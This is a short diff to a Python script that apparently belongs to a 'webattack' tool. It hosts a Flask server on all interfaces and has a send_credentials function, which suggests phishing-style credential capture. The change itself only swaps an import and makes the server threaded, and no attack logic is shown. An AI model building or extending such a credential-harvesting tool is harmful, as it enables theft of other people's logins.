@@ -4,7 +4,7 @@ import argparse
 from bs4 import BeautifulSoup
 from flask import Flask, request, jsonify
 import threading
-import signal
+import time
 
 # Flask Setup for Hosting Server
 app = Flask(__name__)
@@ -57,8 +57,8 @@ def send_credentials(credentials):
         print(f"Error in sending credentials: {e}")
 
 def run_flask():
-    """Run Flask application."""
-    app.run(debug=False, host="0.0.0.0", port=5000)
+    """Run Flask application in a separate thread."""
+    app.run(debug=False, host="0.0.0.0", port=5000, threaded=True)
 
 def execute_command(command):
     """Simulate command-line interface for webattack tool."""
